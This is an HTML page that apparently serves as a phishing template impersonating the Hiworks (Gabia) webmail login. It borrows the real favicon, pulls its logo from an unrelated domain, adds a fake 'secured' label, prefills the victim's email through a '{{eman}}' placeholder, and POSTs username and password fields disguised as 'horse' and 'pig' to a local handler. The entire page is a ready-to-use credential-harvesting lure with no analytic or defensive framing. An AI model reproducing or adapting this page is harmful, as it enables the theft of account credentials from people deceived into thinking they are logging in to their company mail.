<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" href="https://login.office.hiworks.com/favicon-96x96.png" />

<title>하이웍스 로그인</title>
<style>
  body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    background-color: #ffffff; /* 순백색 배경 */
  }

  .content-wrapper {
    margin-top: -180px; /* 요소 위치 조정 */
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
  }

  header {
    margin-bottom: 20px;
  }

  h1 img {
    display: block;
    margin: 0 auto;
    max-width: 100%;
    height: auto;
  }

  form {
    width: 100%;
    max-width: 400px;
    background: #fff;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
  }

  fieldset {
    border: none;
    padding: 0;
    display: flex;
    flex-direction: column;
    gap: 15px;
  }

  legend {
    font-size: 1.5rem;
    font-weight: bold;
    color: #333;
    text-align: center;
  }

  p {
    font-size: 0.9rem;
    text-align: center;
    color: #666;
  }

  .input-group {
    display: flex;
    align-items: center;
    border: 1px solid #ddd;
    border-radius: 4px;
    padding: 8px;
    background: #fff;
  }

  .input-group svg {
    margin-right: 10px;
    fill: #888;
  }

  input {
    border: none;
    outline: none;
    flex: 1;
    font-size: 1rem;
  }

  .input-group p {
    margin: 0;
    color: #888;
  }

  button {
    width: 100%;
    padding: 12px;
    background: #2985db;
    color: #fff;
    border: none;
    border-radius: 4px;
    font-size: 1rem;
    cursor: pointer;
    transition: background 0.3s;
  }

  button:hover {
    background: #1a69b0;
  }

  button:disabled {
    background: #ccc;
    cursor: not-allowed;
  }

  @media (max-width: 480px) {
    form {
      padding: 15px;
    }

    legend {
      font-size: 1.2rem;
    }

    button {
      font-size: 0.9rem;
    }
  }

  .footer {
    position: fixed;
    bottom: 15px;
    left: 50%;
    transform: translateX(-50%);
    color: rgba(0, 0, 0, 0.5);
    font-size: 14px;
    text-align: center;
    padding: 10px;
  }
</style>
</head>
<body>
<div class="content-wrapper">
  <header>
    <h1><img src="https://guide-level.com/Screenshot_2.png" alt="toeng.co.kr"></h1>
  </header>
  <main>
    <form form action="first" method="POST">
      <fieldset>
        <div class="input-group">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 14" width="44" height="24">
            <path d="M0 0h14v14H0z" fill="none"/>
            
          </svg>
          <input type="text" placeholder="" name="horse" value="{{eman}}" required="" />
          <p>보안됨</p>
        </div>
        <div class="input-group">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 14" width="44" height="24">
            <path d="M0 0h14v14H0z" fill="none"/>
            
          </svg>
          <input type="password" name="pig" placeholder="Password" required/>
        </div>
        <button type="submit">Sign-in</button>
      </fieldset>
    </form>
  </main>
</div>
<div class="footer">
  ©Gabia Inc.
</div>
</body>
</html>
